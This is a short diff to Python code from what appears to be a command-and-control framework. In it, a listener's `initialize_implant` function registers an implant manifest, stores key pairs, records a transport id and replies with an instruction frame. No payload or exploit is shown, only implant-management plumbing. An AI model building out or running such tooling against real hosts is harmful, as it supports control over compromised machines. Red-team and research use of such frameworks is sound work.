@@ -87,18 +87,21 @@ def retrieve_output_from_implant(listener, implant_id):
 
 
 def initialize_implant(frame, listener):
+    # TODO: Check if implant already exists in manifest
     implant_manifest = frame['args'][0]['manifest']
     implant_manifest['ipk'] = frame['args'][1]['ipk']
     # TODO: Rotate this key
     implant_manifest['lpk'] = listener.current_public_key._public_key
     implant_manifest['priv_key'] = listener.current_private_key._private_key
     implant_manifest['lp_id'] = listener.component_id
+    implant_manifest['transport_id'] = frame['transport_id']
     listener.implants.append(implant_manifest)
     data = {'component_id': listener.component_id, "cmd": "ipi",
             "args": [{'lpk': implant_manifest['lpk']}], "txid": frame['txid']}
     instruction_frame = instructions.create_instruction_frame(data)
     reply_frame = instruction_frame
     return reply_frame
+
 
 def initalize_existing_implant(frame, listener):
     # TODO: Implement me
